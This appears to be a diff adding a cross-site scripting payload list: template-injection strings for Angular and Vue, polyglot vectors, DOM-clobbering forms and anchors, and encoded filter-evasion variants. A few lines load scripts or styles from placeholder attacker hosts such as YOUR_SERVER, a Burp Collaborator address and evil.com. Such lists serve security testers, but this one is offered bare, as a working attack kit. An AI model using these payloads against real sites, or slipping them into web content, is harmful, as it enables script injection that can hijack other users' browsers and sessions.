@@ -1,0 +1,33 @@
+<style>@import'//YOUR_SERVER/xss.css';</style>
+<script src="https://YOUR_BURP_COLLABORATOR"></script>
+<link rel=stylesheet href="//YOUR_SERVER/xss.css">
+{{constructor.constructor('alert(1)')()}}
+{{_c.constructor('alert(1)')()}}
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+" @click="alert(1)" foo="
+" v-bind:href="'javascript:alert(1)'" "
+'"><svg/onload=alert(1)>//
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+<form id="__proto__"><input name="isAdmin" value="true"></form>
+<a id="config" href="http://evil.com"></a>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<svg><style><img src=x onerror=alert(1)></style></svg>
+" onMouseEnter={alert(1)} foo="
+<td onClick={()=>alert(document.domain)}>TEST</td>
+<iMg sRc=x OnErRoR=alert(1)>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+<img src=x onerror="eval('\x61\x6c\x65\x72\x74(1)')">
+<img src=x onerror="%61%6c%65%72%74(1)">
+<img src=x onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video onloadstart=alert(1) src=x>
+<audio onloadstart=alert(1) src=x>
+<svg onload=alert(1)>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
